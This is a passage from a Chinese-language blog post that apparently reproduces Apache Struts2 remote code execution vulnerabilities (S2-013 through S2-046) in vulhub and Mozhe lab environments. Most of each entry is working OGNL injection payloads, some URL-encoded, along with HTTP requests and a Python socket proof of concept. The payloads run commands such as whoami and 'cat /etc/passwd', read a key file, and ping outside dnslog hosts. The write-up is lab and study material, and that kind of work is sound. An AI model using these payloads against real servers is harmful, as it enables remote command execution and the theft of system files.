+<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h4 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ping&quot;, &quot;test.gh6gw2.dnslog.cn&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在dnslog记录</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162617953.png" class title="image-20220309162617953">
+
+
+
+<h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><h4 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
+<ol>
+<li>none - 链接不包含请求的任意参数值（默认）</li>
+<li>get - 链接只包含 GET 请求中的参数和其值</li>
+<li>all - 链接包含 GET 和 POST 所有参数和其值</li>
+</ol>
+<p><code>&lt;s:a&gt;</code>用来显示一个超链接，当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
+<h4 id="漏洞版本-5"><a href="#漏洞版本-5" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.1</p>
+<h4 id="漏洞探测-6"><a href="#漏洞探测-6" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如：<code>http://your-ip:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p>
+<p>返回服务器id信息</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163452580.png" class title="image-20220309163452580">
+
+<h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>当前用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;whoami&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163701251.png" class title="image-20220309163701251">
+
+<p><strong>命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.211.129:8080/link.action?a=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.l2plmu.dnslog.cn%22%29%29%7D</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163936553.png" class title="image-20220309163936553">
+
+<h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><h4 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p>
+<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder(‘calc’)).start() 来解决，另外还可以借助 Java 反射机制去间接修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞版本-6"><a href="#漏洞版本-6" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.2</p>
+<h4 id="漏洞探测-7"><a href="#漏洞探测-7" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>获取id</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164631462.png" class title="image-20220309164631462">
+
+<h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20%2Fetc%2Fpasswd%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164936562.png" class title="image-20220309164936562">
+
+
+
+<h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>vulhub搭建环境失败，使用墨者学院进行复现</p>
+<p>靶场地址:</p>
+<p><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/MkhJb2Jpblh4MkYrMjkrNC84UjZtUT09bW96aGUmozhe">Apache Struts2远程代码执行漏洞(S2-016)复现_命令执行_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
+<h4 id="漏洞简介-8"><a href="#漏洞简介-8" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能。</p>
+<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
+<h4 id="漏洞版本-7"><a href="#漏洞版本-7" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.15</p>
+<h4 id="漏洞探测-8"><a href="#漏洞探测-8" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问ip:port&#x2F;index.action?redirect:%25%7b%33%2a%34%7d，执行表达式</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152313906.png" class title="image-20220310152313906">
+
+<h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;ls&#x27;,&#x27;/&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其进行URL编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行后下载文件</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152608959.png" class title="image-20220310152608959">
+
+
+
+<p>文件内容为执行的命令ls，列举出所有文件及文件夹</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152631918.png" class title="image-20220310152631918">
+
+
+
+<p>看到存在key.txt文件，下面就是下载key.txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;cat&#x27;,&#x27;key.txt&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用url编码处理该poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%63%61%74%27%2c%27%6b%65%79%2e%74%78%74%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>
+
+<p>得到key</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310153802154.png" class title="image-20220310153802154">
+
+<h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><h4 id="漏洞简介-9"><a href="#漏洞简介-9" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用<code>method:&lt;name&gt;</code>的方式来调用名字是<code>&lt;name&gt;</code>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。</p>
+<h4 id="漏洞版本-8"><a href="#漏洞版本-8" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.20 -  2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<h4 id="漏洞探测-9"><a href="#漏洞探测-9" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取id值</strong></p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309200932329.png" class title="image-20220309200932329">
+
+
+
+<h4 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ip:port/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat%20%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309201419829.png" class title="image-20220309201419829">
+
+<h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><h4 id="漏洞简介-10"><a href="#漏洞简介-10" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>在文件上传页面，对请求体中Content-Type中插入payload可执行OGNL表达式</p>
+<h4 id="漏洞版本-9"><a href="#漏洞版本-9" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
+<p>2.5 -  2.5.10</p>
+<h4 id="漏洞探测-10"><a href="#漏洞探测-10" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>OCNL表达式成功执行</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210227571.png" class title="image-20220309210227571">
+
+
+
+
+
+<h4 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>计算表达式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,12345*12345)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210540452.png" class title="image-20220309210540452">
+
+<h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><h4 id="漏洞简介-11"><a href="#漏洞简介-11" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\x00</code>截断。</p>
+<h4 id="漏洞版本-10"><a href="#漏洞版本-10" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
+<p> 2.5 -  2.5.10</p>
+<h4 id="漏洞探测-11"><a href="#漏洞探测-11" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span><br></pre></td></tr></table></figure>
+
+<p>直接使用burp拦截修改filename未成功，下面使用poc进行探测</p>
+<p><strong>poc</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>响应包中可以看到添加的表达式</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100219241.png" class title="image-20220310100219241">
+
+<h4 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可修改poc中表达式进行命令执行</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100505156.png" class title="image-20220310100505156">
+
+
+
+<h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><h4 id="漏洞简介-12"><a href="#漏洞简介-12" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>触发OGNL表达式的位置是<code>Gangster Name</code>这个表单。访问<code>http://your-ip:8080/showcase/</code>即可查看到struts2的测试页面。访问Integration&#x2F;Struts 1 Integration</p>
